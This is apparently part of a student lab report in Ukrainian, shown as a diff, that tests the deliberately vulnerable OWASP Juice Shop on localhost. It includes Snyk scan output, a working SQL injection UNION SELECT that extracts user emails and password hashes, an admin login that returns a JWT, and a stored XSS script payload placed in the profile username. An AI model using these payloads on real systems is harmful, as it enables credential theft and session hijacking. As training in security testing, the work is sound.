@@ -153,4 +153,103 @@ VU=150     1434         1436.0          628.9           0.00
 
 ## 2 part OWASP
 
-tool: semgrep
+tool: snyk
+
+```
+snyk test
+
+Testing D:\GitHub\lab_qa4\juice-shop...
+
+Tested 814 dependencies for known issues, found 85 issues, 128 vulnerable paths.
+```
+
+в файлах snyk-dependencies та snyk-code можна знайти виводи які були в консолі при запуску команд.
+
+Загальна проблема вразливостей, знайшлися А06 та А03 в комплекті, де sanitize-html має запобігати XSS а сам в собі має xss.
+
+Ну а етап ін'єкцій наразі це будуть curl-и які і раніше на апі дизайні розглядалися.
+
+### SQL:
+
+підтвердження ін'єкції оскільки в запиті іде лапка і сервер її схавав.
+
+```bash
+PS D:\GitHub\lab_qa4\juice-shop> curl "http://localhost:3000/rest/products/search?q=apple'"
+curl : The remote server returned an error: (500) Internal Server Error.
+At line:1 char:1
++ curl "http://localhost:3000/rest/products/search?q=apple'"
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+```
+
+також "пошуковий запит" який в результаті дав зробити запит в базу даних і отримати дані користувачів.
+
+```bash
+curl "http://localhost:3000/rest/products/search?q=apple')) UNION SELECT id, email, password, '4','5','6','7','8','9' FROM Users--"
+
+
+StatusCode        : 200
+StatusDescription : OK
+Content           : {"status":"success","data":[{"id":1,"name":"admin@juice-sh.op","description":"0192023a7bbd73250516f069df18b500","price":"4","deluxePrice":"5","image":"6","createdAt":"7","upd
+                    atedAt":"8","deletedAt":"9...
+RawContent        : HTTP/1.1 200 OK
+                    Access-Control-Allow-Origin: *
+                    X-Content-Type-Options: nosniff
+                    X-Frame-Options: SAMEORIGIN
+                    Feature-Policy: payment 'self'
+                    X-Recruiting: /#/jobs
+                    Vary: Accept-Encoding
+                    Connection:...
+Forms             : {}
+Headers           : {[Access-Control-Allow-Origin, *], [X-Content-Type-Options, nosniff], [X-Frame-Options, SAMEORIGIN], [Feature-Policy, payment 'self']...}
+Images            : {}
+InputFields       : {}
+Links             : {}
+ParsedHtml        : mshtml.HTMLDocumentClass
+RawContentLength  : 4088
+```
+
+### HTML
+
+розбираємось з XSS в html
+
+```bash
+curl.exe -s -X POST http://localhost:3000/rest/user/login `
+>>   -H "Content-Type: application/json" `
+>>   -d '{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}'
+{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNy0xNyAyMDo0MjowNC43MzMgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNy0xNyAyMDo0MjowNC43MzMgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjoxLCJpYXQiOjE3ODQzMjM0ODN9.f-r6CaZpUemj0I3dQ7CbUvMln369pGBSCl2D0wd5arxQjDmDjLU5wSbWJ_lyFzPZQ4vczhgqvkhY782C3HPLb726mamujrL0ZI_HuFho1T2mbxVTyY83AEgwBWKjUgZYE0f3c3ANlgzEHLKYuwP-weQeRMtKxfAziyqSFVaypnE","bid":1,"umail":"admin@juice-sh.op"}}
+```
+
+тут вже в запит заклали токен і
+
+```html
+PS D:\GitHub\lab_qa4\juice-shop> curl.exe -X POST http://localhost:3000/profile
+` >> -H "Content-Type: application/x-www-form-urlencoded" ` >> -H "Cookie:
+token=eyJ0mamujrL0ZI_HuFho1T2mbxVTyY83AEgwBWKjUgZYE0f3c3ANlgzEHLKYuwP-weQeRMtKxfAziyqSFVaypnE"
+` >> -d "username=
+<script>
+  alert("XSS");
+</script>
+" Found. Redirecting to /profile
+```
+
+в результаті маємо шо токен авторизації в доступі, і зміна інформації користувача легко може піддатись ін'єкції. Це не є вразливістю сервера, або бази. Це вразливість того, що при побудові html файлу відбувається вставка імені користувача і спец символи можуть сприйнятись як частина html.
+
+Браузер отримавши таку сторінку, не може відрізнити "це текст імені користувача" від "це справжній HTML-тег <script> і просто виконує його як код.
+Результат атаки: довільний JavaScript виконується в браузері юзера від його імені, з його сесією. Це відкриває крадіжку сесій, дії від імені жертви, фішинг і точні дані скільки яблучного соку юзер купив в juice-shope
+
+```html
+D:\GitHub\lab_qa4\juice-shop> curl.exe -s http://localhost:3000/profile `
+>>   -H "Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjoxLCJpYXQiOjE3ODQzMjM0ODN9.f-r6CaZpUemj0I3dQ7CbUvMln369pGBSCl2D0wd5arxQjDmDjLU5wSbWJ_lyFzPZQ4vczhgqvkhY782C3HPLb726mamujrL0ZI_HuFho1T2mbxVTyY83AEgwBWKjUgZYE0f3c3ANlgzEHLKYuwP-weQeRMtKxfAziyqSFVaypnE"
+<!DOCTYPE html><html lang="en"><head><title>OWASP Juice Shop</title><meta charset="utf-8"><meta name="description" content=""><meta name="keywords" content=""><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="icon" type="image/x-icon" href="./assets/public/favicon_js.ico"><link rel="stylesheet" href="/vendor/beercss/beer.min.css"><link rel="stylesheet" href="/vendor/material-icons/material-icons.css"><link rel="stylesheet" href="./assets/public/css/roboto.css" type="text/css"><link rel="stylesheet" href="./assets/public/css/userProfile.css" type="text/css"><script type="module" src="/vendor/beercss/beer.min.js"></script><style>body { background: #303030 !important; color: #FFFFFF !important; }
+article { background: #3e3e3e !important; }
+button.fill { background-color: #4f6f7a !important; color: #FFFFFF !important; }
+.profile-field label { color: #FFFFFF !important; font-size: 13px !important; display: block !important; margin-bottom: 4px; }
+.profile-field input { border: 1px solid #FFFFFF !important; border-radius: 4px !important; padding: 12px !important; font-size: 14px !important; color: #FFFFFF !important; background: transparent !important; width: 100% !important; box-sizing: border-box !important; height: auto !important; min-height: 44px !important; }
+.profile-field input::placeholder { color: rgba(255,255,255,0.5); font-size: 0.85em; }
+.profile-field { margin-bottom: 12px; }
+.brand { display: flex; align-items: center; gap: 8px; text-decoration: none; color: #FFFFFF; }
+.brand img { max-height: 50px; width: auto; }
+.brand span { font: 500 20px/32px Roboto,"Helvetica Neue",sans-serif; }</style></head><body><header style="background: #4f6f7a; padding: 8px 16px;"><nav><a href="./#/" style="color: #FFFFFF; text-decoration:none;"><i class="material-icons">arrow_back</i></a><a href="./#/" style="color: #FFFFFF; text-decoration:none;">Back</a><a class="brand" href="./#/"><img src="assets/public/images/JuiceShop_Logo.png" alt="OWASP Juice Shop Logo"><span class="app-title">OWASP Juice Shop</span></a><div class="max"></div></nav></header><main style="padding: 16px;"><article id="card" style="min-width: 300px; max-width: 900px; margin: 24px auto; padding: 24px; border-radius: 12px;"><h5 style="color: #FFFFFF; margin-bottom: 16px;">User Profile</h5><div class="grid"><div class="s12 m12 l6"><img class="img-rounded" src="assets/public/images/uploads/defaultAdmin.png" alt="profile picture" width="90%" height="236" style="margin-right: 5%; margin-left: 5%;"><p style="margin-top: 8px; color: #FFFFFF; text-align: center;">\lert('XSS')</script></p><form action="./profile/image/file" style="margin-top: 16px; width: 90%; margin-right: auto; margin-left: auto;" method="post" enctype="multipart/form-data"><div class="profile-field"><label for="picture">File Upload:</label><input id="picture" type="file" accept="image/*" name="file" size="150" aria-label="Input for selecting the profile picture"></div><button class="fill" type="submit" style="margin-top: 8px; text-transform: capitalize;" aria-label="Button to upload the profile picture">Upload Picture</button></form><div class="breakLine" style="margin-top: 12px; margin-bottom: 12px; width: 90%; margin-right: auto; margin-left: auto;"><div class="line"><div></div></div><div class="textOnLine" style="color: #FFFFFF;">or</div><div class="line"><div></div></div></div><form action="./profile/image/url" style="margin-top: 8px; width: 90%; margin-right: auto; margin-left: auto;" method="post"><div class="profile-field"><label for="url">Image URL:</label><input id="url" type="text" name="imageUrl" placeholder="e.g. https://www.gravatar.com/avatar/526703ac2bd7cd675e872393a0744bf5" aria-label="Text field for the image link"></div><button class="fill" id="submitUrl" type="submit" style="margin-top: 8px; text-transform: capitalize;" aria-label="Button to include image from link">Link Image</button></form></div><div class="s12 m12 l6"><form action="./profile" method="post" style="width: 90%; margin-right: auto; margin-left: auto;"><div class="profile-field"><label for="email">Email:</label><input id="email" type="email" name="email" value="admin@juice-sh.op" disabled style="opacity: 0.7;" aria-label="Disabled - Text field for the email"></div><div class="profile-field"><label for="username">Username:</label><input id="username" type="text" name="username" value="lert('XSS')&lt;/script&gt;" placeholder="e.g. SuperUser" aria-label="Text field for the username"></div><button class="fill" id="submit" type="submit" style="margin-top: 8px; text-transform: capitalize;" aria-label="Button to save/set the username">Set Username</button></form></div></div></article></main></body></html>
+```
